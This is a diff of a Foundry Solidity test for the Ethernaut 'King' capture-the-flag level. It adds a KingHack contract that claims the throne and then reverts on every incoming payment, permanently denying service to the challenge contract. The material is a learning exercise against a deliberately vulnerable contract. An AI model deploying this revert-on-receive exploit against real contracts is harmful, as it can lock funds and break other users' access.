@@ -3,7 +3,6 @@ pragma solidity ^0.8.14;
 
 import "forge-std/Test.sol";
 import "../src/King/KingFactory.sol";
-import "../src/King/KingHack.sol";
 import "../src/Ethernaut.sol";
 import "forge-std/console.sol";
 
@@ -34,8 +33,8 @@ contract KingTest is Test {
          *************** */
         KingHack kingHack = new KingHack(payable(levelAddress));
         address initialKing = ethernautKing._king();
-        /**In the hack contract, in attack function, we need to pass a msg.value
-         *calling the receive of the base contract
+        /* In the hack contract, in attack function, we need to pass a msg.value
+         * calling the receive of the base contract
          * In order to claim ownership, we either need a value >= prize or be the owner
          * When calling the attack function you should see a log with a reverted transaction
          * It's normal because of the way the initial contract is designed
@@ -53,5 +52,24 @@ contract KingTest is Test {
         );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract KingHack {
+    King public challenge;
+
+    constructor(address challengeAddress) {
+        challenge = King(payable(challengeAddress));
+    }
+
+    function attack() external payable {
+        (bool success, ) = payable(address(challenge)).call{value: msg.value}(
+            ""
+        );
+        require(success, "Call failed");
+    }
+
+    receive() external payable {
+        require(false, "Can's steal my throne bro!");
     }
 }
